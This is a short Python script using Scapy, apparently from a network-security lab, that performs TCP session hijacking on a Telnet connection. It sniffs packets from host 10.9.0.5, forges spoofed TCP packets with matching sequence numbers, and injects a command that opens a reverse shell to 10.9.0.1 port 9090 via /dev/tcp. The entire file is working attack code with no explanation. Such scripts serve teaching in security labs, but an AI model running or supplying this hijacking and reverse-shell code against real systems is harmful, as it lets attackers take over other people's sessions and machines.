#!/usr/bin/env python3
from scapy.all import *

def tcp_spoofer(pkt):
	ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
	tcp = TCP(sport = pkt[TCP].dport, dport = pkt[TCP].sport, flags="A",seq=pkt[TCP].ack+5, ack = pkt[TCP].seq+len(pkt[TCP].payload))
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
	pkt = ip/tcp/data
	send(pkt, iface ="br-f0c09430fd56", verbose=0)
pkt = sniff(iface = 'br-f0c09430fd56', filter = 'tcp and src host 10.9.0.5 and src port 23', prn = tcp_spoofer)
